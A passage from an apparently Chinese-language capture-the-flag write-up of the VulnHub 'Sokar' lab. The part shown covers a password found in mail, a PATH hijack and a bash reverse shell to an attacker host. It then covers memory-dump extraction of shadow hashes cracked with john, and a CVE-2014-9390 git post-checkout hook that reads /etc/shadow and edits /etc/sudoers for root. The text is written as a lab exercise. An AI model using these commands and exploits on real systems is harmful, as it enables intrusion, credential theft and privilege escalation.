unix  <span class="m">2</span>      <span class="o">[</span> ACC <span class="o">]</span>     STREAM     LISTENING     <span class="m">6863</span>   @/com/ubuntu/upstart
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    <span class="m">7006</span>   @/org/kernel/udev/udevd
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    49323
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    37526
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    36381
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    26496
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    26128
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    9264
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    8406
unix  <span class="m">3</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    7022
unix  <span class="m">3</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    7021

Linux 2.6.32-504.1.3.el6.x86_64 <span class="o">(</span>sokar<span class="o">)</span>         02/28/2015      _x86_64_        <span class="o">(</span><span class="m">1</span> CPU<span class="o">)</span>

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          39.39    0.00   29.65    0.04    0.00   30.92

Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn
sda               1.00        29.04        20.94    <span class="m">1922802</span>    1386464
sdb               0.01         0.04         0.01       <span class="m">2710</span>        754</code></pre></div>


<p>繼續找找這台機器上其他的資訊，找到了/var/spool/mail/bynarr，得到了bynarr的密碼&#8221;fruity&#8221;，並且知道bynarr可以連結外部的51242 port</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span>: cat /var/spool/mail/bynarr
Return-Path: &lt;root@sokar&gt;
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: &lt;bynarr@sokar&gt;
Date: Thu, <span class="m">13</span> Nov <span class="m">2014</span> 22:04:31 +0100
Subject: Welcome

Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup <span class="k">for</span> you.

UID <span class="m">500</span> <span class="o">(</span>bynarr<span class="o">)</span>
GID <span class="m">500</span> <span class="o">(</span>bynarr<span class="o">)</span>
        <span class="m">501</span> <span class="o">(</span>forensic<span class="o">)</span>

Password <span class="s1">&#39;fruity&#39;</span>.  Please change this ASAP.
Should you require, you<span class="err">&#39;</span>ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out <span class="k">for</span> analysis.

All the best in your new role!

  -Sokar-</code></pre></div>


<p>再研究一下bynarr的家目錄(/home/bynarr)，會發現.bash_profile有一行</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>:<span class="nv">$HOME</span>/bin</code></pre></div>


<p>bynarr的家目錄被設成PATH的第一順位</p>

<p>接下來嘗試看看能不能在家目錄用同名的程式來取代原本列出狀態用的程式(netstat和iostat)</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;#!/bin/bash&quot;</span> &gt; /home/bynarr/netstat
<span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;echo netstat&quot;</span> &gt;&gt; /home/bynarr/netstat
<span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;#!/bin/bash&quot;</span> &gt; /home/bynarr/iostat
<span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;echo iostat&quot;</span> &gt;&gt; /home/bynarr/iostat
<span class="o">[</span>apache@sokar<span class="o">]</span>: chmod +x /home/bynarr/netstat
<span class="o">[</span>apache@sokar<span class="o">]</span>: chmod +x /home/bynarr/iostat</code></pre></div>


<p>建完檔案等排程時間到了之後再重整一下首頁，就會發現iostat被替換成自己建立的偽‧iostat</p>

<p><img class="left" src="http://newdominic.github.io/images/2015-03-02-sokar/iostat.PNG"></p>

<p>再來就要靠這個偽‧iostat來取得bynarr的reverse shell</p>

<p>先在Kali上面監聽51242這個port後，再去修改一下/home/bynarr/iostat的內容</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span> <span class="nb">echo</span> <span class="s2">&quot;!#/bin/bash&quot;</span> &gt; /home/bynarr/iostat
<span class="o">[</span>apache@sokar<span class="o">]</span> <span class="nb">echo</span> <span class="s2">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.128/51242 0&gt;&amp;1&quot;</span> &gt;&gt; /home/bynarr/iostat</code></pre></div>


<p>等排程時間一到，就拿到bynarr的shell了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# nc -lvp 51242
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">51242</span> ...
192.168.2.154: inverse host lookup failed: Unknown server error : Connection timed out
connect to <span class="o">[</span>192.168.2.128<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.154<span class="o">]</span> 36824
bash: no job control in this shell
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="err">$</span></code></pre></div>


<p>拿到bynarr的shell之後，先來看一下他有沒有sudo的權限</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS</span>
<span class="s2">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1</span>
<span class="s2">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE</span>
<span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY</span>
<span class="s2">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL</span>
<span class="s2">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
 
User bynarr may run the following commands on this host:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/bynarr/lime</code></pre></div>


<p>執行lime時可以選擇要掛載或卸除lime.ko的核心模組，這邊就直接掛載上去</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo /home/bynarr/lime
sudo /home/bynarr/lime
<span class="o">==========================</span>
Linux Memory <span class="nv">Extractorator</span>
<span class="o">==========================</span>
LKM, add or remove?
&gt; remove
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo /home/bynarr/lime
sudo /home/bynarr/lime
<span class="o">==========================</span>
Linux Memory <span class="nv">Extractorator</span>
<span class="o">==========================</span>
LKM, add or remove?
&gt; add</code></pre></div>


<p>lime掛載上去後，會把記憶體dump到/tmp/ram，而看起來/tmp/ram的內容還有一些可讀的字串</p>

<p>來看看能不能從這些字串中得到其他使用者的資訊</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar tmp<span class="o">]</span><span class="nv">$ </span>strings ram <span class="p">|</span> grep apophis
strings ram <span class="p">|</span> grep apophis
apophis:<span class="nv">$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz</span>/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
<span class="o">[</span>bynarr@sokar tmp<span class="o">]</span><span class="nv">$ </span>strings ram <span class="p">|</span> grep <span class="s2">&quot;root:&quot;</span>
strings ram <span class="p">|</span> grep <span class="s2">&quot;root:&quot;</span>
root:<span class="nv">$6$cWQYjirZ$rADNjUFSiHmYp</span>.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::</code></pre></div>


<p>拿到了疑似密碼hash，餵給john解</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt password 
Warning: detected <span class="nb">hash type</span> <span class="s2">&quot;sha512crypt&quot;</span>, but the string is also recognized as <span class="s2">&quot;crypt&quot;</span> Use the <span class="s2">&quot;--format=crypt&quot;</span>
option to force loading these as that <span class="nb">type </span>instead Loaded <span class="m">2</span> password hashes with <span class="m">2</span> different salts
<span class="o">(</span>sha512crypt <span class="o">[</span>64/64<span class="o">])</span>
 
overdrive <span class="o">(</span>apophis<span class="o">)</span></code></pre></div>


<p>接著來登入apophis</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>su apophis
su apophis
standard in must be a tty
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>su apophis
su apophis
Password: overdrive

<span class="o">[</span>apophis@sokar bynarr<span class="o">]</span><span class="err">$</span></code></pre></div>


<p>在apophis的家目錄裡面發現一個程式(build)。擁有者是root，而且設有sticky bit，看起來非常可疑，直接執行看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
ssh: Could not resolve hostname sokar-dev: Name or service not known
fatal: Could not <span class="nb">read </span>from remote repository.

Please make sure you have the correct access rights
and the repository exists.</code></pre></div>


<p>拿去餵狗後會發現是git的錯誤訊息，主因是找不到sokar-dev這個hostname</p>

<p>想說能不能輕鬆改個/etc/hosts連回攻擊端，不過只有root有寫入權限，只好想想其他辦法</p>

<p>找半天終於找到/etc/resolv.conf有可寫的權限，看來是要自己架一個DNS server和git repository了</p>

<p>參考這個<a href="https://www.youtube.com/watch?v=0F_q44U4PDM">影片</a>把DNS server架起來之後，因為不知道git要抓哪個路徑下的repository，先回sokar跑一次build看會不會再噴錯誤</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
The authenticity of host <span class="s1">&#39;sokar-dev (192.168.2.128)&#39;</span> can<span class="s1">&#39;t be established.</span>
<span class="s1">RSA key fingerprint is d8:38:99:c5:d1:a1:ea:e7:48:cc:bc:d1:ad:bf:76:9c.</span>
<span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
<span class="s1">yes</span>
<span class="s1">Warning: Permanently added &#39;</span>sokar-dev,192.168.2.128<span class="s1">&#39; (RSA) to the list of known hosts.</span>
<span class="s1">root@sokar-dev&#39;</span>s password: <span class="c">###########</span>

fatal: <span class="s1">&#39;/root/secret-project&#39;</span> does not appear to be a git repository
fatal: Could not <span class="nb">read </span>from remote repository.

Please make sure you have the correct access rights
and the repository exists.</code></pre></div>


<p>回Kali把repository建起來</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">mkdir /root/secret-project
<span class="nb">cd</span> /root/secret-project
git init</code></pre></div>


<p>從sokar再執行一次build就能成功clone repository了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
root@sokar-dev<span class="err">&#39;</span>s password: <span class="c">###########</span>

warning: You appear to have cloned an empty repository.
Checking connectivity... <span class="k">done</span>.</code></pre></div>


<p>做到這裡又卡住一陣子，最後靠google git exploit找到一個git的bug(<a href="https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/">CVE-2014-9390</a>)</p>

<p>但是要運用這個bug的前提是：檔案系統不會區分大小寫(case insensitive)</p>

<p>先來看看/mnt/secret-project所在的檔案系統</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar secret-project<span class="o">]</span><span class="nv">$ </span>mount
mount
/dev/sda1 on / <span class="nb">type </span>ext4 <span class="o">(</span>rw<span class="o">)</span>
proc on /proc <span class="nb">type </span>proc <span class="o">(</span>rw<span class="o">)</span>
sysfs on /sys <span class="nb">type </span>sysfs <span class="o">(</span>rw<span class="o">)</span>
devpts on /dev/pts <span class="nb">type </span>devpts <span class="o">(</span>rw,gid<span class="o">=</span>5,mode<span class="o">=</span>620<span class="o">)</span>
tmpfs on /dev/shm <span class="nb">type </span>tmpfs <span class="o">(</span>rw<span class="o">)</span>
/dev/sdb1 on /mnt <span class="nb">type </span>vfat <span class="o">(</span>rw,uid<span class="o">=</span>501,gid<span class="o">=</span>502<span class="o">)</span>
none on /proc/sys/fs/binfmt_misc <span class="nb">type </span>binfmt_misc <span class="o">(</span>rw<span class="o">)</span></code></pre></div>


<p>vfat是<a href="http://en.wikipedia.org/wiki/Case_sensitivity">case insensitive</a>的系統！ 接著就是實作的部分了！</p>

<p>先回Kali建個測試用的檔案</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/secret-project# mkdir .GiT
root@kali:~/secret-project# <span class="nb">cd</span> .GiT/
root@kali:~/secret-project/.GiT# mkdir hooks
root@kali:~/secret-project/.GiT# <span class="nb">cd </span>hooks/
root@kali:~/secret-project/.GiT/hooks# cat post-checkout
<span class="c">#!/bin/bash</span>
cat /etc/shadow</code></pre></div>


<p>將post-checkout設定成可執行後把新增的內容commit進repository</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/secret-project/.GiT/hooks# chmod +x post-checkout
root@kali:~/secret-project/.GiT/hooks# <span class="nb">cd</span> ..
root@kali:~/secret-project/.GiT# <span class="nb">cd</span> ..
root@kali:~/secret-project# git add .GiT
root@kali:~/secret-project# git commit -m <span class="s2">&quot;CVE-2014-9390&quot;</span>
<span class="o">[</span>master <span class="o">(</span>root-commit<span class="o">)</span> 7523455<span class="o">]</span> CVE-2014-9390
 Committer: root &lt;root@localhost.localdomain&gt;
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly:

    git config --global user.name <span class="s2">&quot;Your Name&quot;</span>
    git config --global user.email you@example.com

After doing this, you may fix the identity used <span class="k">for</span> this commit with:

    git commit --amend --reset-author

 <span class="m">1</span> file changed, <span class="m">2</span> insertions<span class="o">(</span>+<span class="o">)</span>
 create mode <span class="m">100755</span> .GiT/hooks/post-checkout</code></pre></div>


<p>回到sokar，把之前產生的repo砍掉後再跑一次build</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>rm -rf /mnt/secret-project
rm -rf /mnt/secret-project
<span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
root@sokar-dev<span class="err">&#39;</span>s password: <span class="c">##########</span>

remote: Counting objects: 5, <span class="k">done</span>.
remote: Total <span class="m">5</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>
Receiving objects: 100% <span class="o">(</span>5/5<span class="o">)</span>, <span class="k">done</span>.
Checking connectivity... <span class="k">done</span>.
root:<span class="nv">$6$cWQYjirZ$rADNjUFSiHmYp</span>.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
bin:*:15628:0:99999:7:::
daemon:*:15628:0:99999:7:::
adm:*:15628:0:99999:7:::
lp:*:15628:0:99999:7:::
sync:*:15628:0:99999:7:::
shutdown:*:15628:0:99999:7:::
halt:*:15628:0:99999:7:::
mail:*:15628:0:99999:7:::
uucp:*:15628:0:99999:7:::
operator:*:15628:0:99999:7:::
games:*:15628:0:99999:7:::
gopher:*:15628:0:99999:7:::
ftp:*:15628:0:99999:7:::
nobody:*:15628:0:99999:7:::
vcsa:!!:16386::::::
saslauth:!!:16386::::::
postfix:!!:16386::::::
sshd:!!:16386::::::
bynarr:<span class="nv">$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4</span>/mhZ3qnVrM/:16434:0:99999:7:::
apache:!!:16386::::::
apophis:<span class="nv">$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz</span>/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::</code></pre></div>


<p>成功讀取到/etc/shadow！再來只要修改post-checkout的執行內容就能拿到root了</p>

<p>本來想說寫一個suid的程式讓post-checkout去編譯，寫到一半想到直接去改/etc/sudoers讓apophis得到全部的權限就可以了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&quot;apophis   ALL=(ALL:ALL) ALL&quot;</span> &gt;&gt; /etc/sudoers</code></pre></div>


<p>修改完post-checkout後再回到sokar重新build過之後就來試試嶄新的sudo</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo /bin/bash
sudo /bin/bash
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> apophis: overdrive

<span class="o">[</span>root@sokar apophis<span class="o">]</span><span class="c"># id</span>
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="o">[</span>root@sokar apophis<span class="o">]</span><span class="c"># cat /root/flag</span>
cat /root/flag
                <span class="m">0</span>   0
                <span class="p">|</span>   <span class="p">|</span>
            ____<span class="p">|</span>___<span class="p">|</span>____
         <span class="m">0</span>  <span class="p">|</span>~ ~ ~ ~ ~ ~<span class="p">|</span>   0
         <span class="p">|</span>  <span class="p">|</span>   Happy   <span class="p">|</span>   <span class="p">|</span>
      ___<span class="p">|</span>__<span class="p">|</span>___________<span class="p">|</span>___<span class="p">|</span>__
      <span class="p">|</span>/<span class="se">\/\/\/\/\/\/\/\/\/\/\/</span><span class="p">|</span>
  <span class="m">0</span>   <span class="p">|</span>    B i r t h d a y    <span class="p">|</span>   0
  <span class="p">|</span>   <span class="p">|</span>/<span class="se">\/\/\/\/\/\/\/\/\/\/\/</span><span class="p">|</span>   <span class="p">|</span>
 _<span class="p">|</span>___<span class="p">|</span>_______________________<span class="p">|</span>___<span class="p">|</span>__
<span class="p">|</span>/<span class="se">\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/</span><span class="p">|</span>
<span class="p">|</span>                                   <span class="p">|</span>
<span class="p">|</span>     V  u  l  n  H  u  b   ! !     <span class="p">|</span>
<span class="p">|</span> ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ <span class="p">|</span>
<span class="p">|</span>___________________________________<span class="p">|</span>

<span class="o">=====================================</span>
<span class="p">|</span> Congratulations on beating Sokar! <span class="p">|</span>
<span class="p">|</span>                                   <span class="p">|</span>
<span class="p">|</span>  Massive shoutout to g0tmi1k and  <span class="p">|</span>
<span class="p">|</span> the entire community which makes  <span class="p">|</span>
<span class="p">|</span>         VulnHub possible!         <span class="p">|</span>
<span class="p">|</span>                                   <span class="p">|</span>
<span class="p">|</span>    rasta_mouse <span class="o">(</span>@_RastaMouse<span class="o">)</span>     <span class="p">|</span>
<span class="o">=====================================</span></code></pre></div>

]]></content>
  </entry>
  
</feed>
